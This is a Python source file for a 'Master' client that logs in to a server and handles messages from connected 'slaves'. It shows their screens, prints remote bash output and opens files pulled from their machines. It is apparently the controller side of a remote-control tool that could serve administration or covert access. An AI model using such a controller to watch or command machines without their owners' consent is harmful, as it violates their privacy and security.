from __future__ import annotations

import json
import time
from typing import TYPE_CHECKING, Any, Optional

from client.client import Client, Payload
from utils import decode_base64

if TYPE_CHECKING:
    from master_ui import MasterUI


class Master(Client):
    def __init__(self, password: str = "", ui: Optional["MasterUI"] = None):
        super().__init__(password=password, auto_reconnect=False, identifier_t="m")
        self.ui = ui

    def start(self, password: Optional[str] = None) -> bool:
        self.stop()
        time.sleep(0.05)

        if password is not None:
            self.password = password
        self.auto_reconnect = False
        self.authenticated = False
        super().start()

        deadline = time.time() + 8.0
        while time.time() < deadline:
            if self.authenticated:
                return True
            if not self.running:
                self.error_callback("Authentication failed")
                return False
            time.sleep(0.05)

        self.stop()
        self.error_callback("Authentication timeout")
        return False

    def close(self) -> None:
        self.stop()

    def on_auth_failed(self) -> None:
        self.error_callback("Invalid password")

    def on_disconnected(self) -> None:
        if self.ui:
            self.ui.send_announce("Disconnected from server", "warn")

    def on_message(self, message: str) -> Optional[Payload]:
        if message.strip() == "ping":
            return "pong"

        if message.startswith("slaves"):
            tree = json.loads(message[6:].lstrip())
            self._set_slaves(tree)
            return None

        tokens = message.split(maxsplit=2)
        if not tokens:
            return None

        root = tokens[0]

        if root == "send" and len(tokens) >= 3:
            subject = tokens[1]
            payload = tokens[2]
            if self.ui:
                if subject == "slave_screen":
                    self.ui.set_screen(payload)
                elif subject == "bash_execution":
                    self.ui.append_bash(decode_base64(payload))
                elif subject == "common_info":
                    self.ui.screen.selected_slave_info = json.loads(decode_base64(payload))
                    self.ui.set_relative(self.ui.screen.selected_slave_info["path"])
                    self.ui.request_local()

                elif subject == "local":
                    self.ui.set_local(json.loads(decode_base64(payload)))
                elif subject == "file":
                    path, content = decode_base64(payload).split("\1")
                    content = decode_base64(content)
                    is_image = path.split(".")[-1] in ["png", "jpg", "jpeg", "svg", "PNG", "JPG", "JPEG", "SVG"]
                    print(f"{path} {is_image}")
                    self.ui.open_file(path, content, is_image)

        return None

    def _set_slaves(self, tree: Any) -> None:
        if not self.ui:
            return
        self.ui.set_slaves(tree)
